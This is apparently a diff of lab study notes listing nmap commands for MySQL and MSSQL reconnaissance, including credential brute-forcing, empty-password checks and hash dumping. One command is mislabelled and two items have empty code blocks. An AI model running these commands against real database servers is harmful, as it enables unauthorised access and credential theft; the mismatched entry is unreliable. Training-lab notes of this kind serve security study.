@@ -477,7 +477,6 @@ dirb http://[ip] /usr/share/metaspoloit-framework/data/wordlist/directory.txt
 msfconsole - use auxiliary/scanner/http/robots_txt
 ```
 
-
 ---
 # MySQL Recon: Basics
 
@@ -570,4 +569,45 @@ nmap --script mysql-dump-hashes --script-args='username=root,password=""' -p 330
 33.  Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
 ```
 nmap --script mysql-query --script-args="query ='select * from books.authors;',username='root',password=''" -p 3306 192.12.132.3
+```
+---
+# Recon: MSSQL: Nmap Scripts
+
+1.  Identify MSSQL Database Server
+```
+nmap [ip]
+
+nmap [ip] -p 1433 -sV
+
+```
+
+3.  Find information from the MSSQL server with NTLM.
+```
+nmap [ip] -p 1433 --script ms-sql-info
+```
+
+5.  Enumerate all valid MSSQL users and passwords
+```
+nmap [ip] -p 1433 --script ms-sql-brute --script-args userdb=/path,passdb=/path
+
+```
+
+7.  Identify 'sa' user password
+```
+nmap [ip] -p 1433 --script ms-sql-empty-password
+```
+
+9.  Execute MSSQL query to extract sysusers
+```
+nmap [ip] -p 1433 --script ms-sql-empty-password
+```
+
+11.  Dump MSSQL users hashes
+```
+
+```
+
+13.  Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)
+```
+
 ```
